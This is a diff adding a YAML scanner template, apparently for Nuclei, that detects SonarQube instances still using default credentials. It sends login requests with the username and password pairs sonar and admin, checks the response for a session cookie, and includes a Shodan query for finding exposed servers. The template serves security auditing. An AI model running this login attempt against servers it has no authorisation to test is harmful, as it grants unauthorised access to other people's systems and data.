@@ -1,0 +1,48 @@
+http:
+- attack: clusterbomb
+  matchers:
+  - condition: and
+    dsl:
+    - status_code == 200
+    - len(body) == 0
+    - contains(set_cookie, "JWT-SESSION=")
+    type: dsl
+  payloads:
+    password:
+    - sonar
+    - admin
+    username:
+    - sonar
+    - admin
+  raw:
+  - 'POST /api/authentication/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    login={{username}}&password={{password}}
+
+    '
+id: sonarqube-default-login
+info:
+  author: Ep1cSage
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  description: 'SonarQube contains a default login vulnerability. An attacker can
+    obtain access to user accounts and access sensitive information, modify data,
+    and/or execute unauthorized operations.
+
+    '
+  metadata:
+    max-request: 4
+    shodan-query: title:"Sonarqube"
+    verified: true
+  name: SonarQube Default Login - Detect
+  reference:
+  - https://docs.sonarsource.com/sonarqube/9.6/instance-administration/security/#:~:text=When%20installing%20SonarQube%2C%20a%20default,Password%3A%20admin
+  severity: high
+  tags: default-login,sonarqube
